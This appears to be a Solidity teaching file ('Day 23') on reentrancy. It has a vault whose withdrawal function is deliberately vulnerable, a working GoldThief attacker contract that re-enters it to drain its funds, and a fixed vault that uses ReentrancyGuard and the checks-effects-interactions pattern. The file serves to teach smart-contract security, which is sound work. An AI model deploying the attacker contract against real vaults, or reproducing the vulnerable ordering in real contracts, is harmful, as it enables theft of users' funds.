// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title GoldVault_Vulnerable
 * @dev Day 23: Vulnerable to Reentrancy Attack (Wrong order of operations)
 */
contract GoldVault_Vulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @notice VULNERABLE FUNCTION
     * Logic: Interaction (call) happens BEFORE Effect (updating balance)
     */
    function withdrawAll() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // Interaction: Sending ETH triggers the fallback/receive of the caller
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // Effect: State update happens too late
        balances[msg.sender] = 0;
    }

    function getVaultBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title GoldThief
 * @dev Attacker contract implementing the reentrancy exploit
 */
contract GoldThief {
    GoldVault_Vulnerable public vault;

    constructor(address _vaultAddress) {
        vault = GoldVault_Vulnerable(_vaultAddress);
    }

    // Step 1: Start the attack by depositing and withdrawing
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdrawAll();
    }

    // Step 2: Triggered when vault sends ETH
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // Re-enter the withdraw function before the first call finishes
            vault.withdrawAll();
        }
    }

    function getThiefBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function stealFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/**
 * @title GoldVault_Safe
 * @dev Day 23 Solution: Implementation of ReentrancyGuard and CEI pattern
 */
contract GoldVault_Safe is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @notice SECURE FUNCTION
     * 1. Modifier: nonReentrant (prevents nested calls)
     * 2. Pattern: Checks-Effects-Interactions (update state before sending)
     */
    function safeWithdrawAll() public nonReentrant {
        // 1. Checks
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // 2. Effects (Update state first!)
        balances[msg.sender] = 0;

        // 3. Interactions (External call last)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
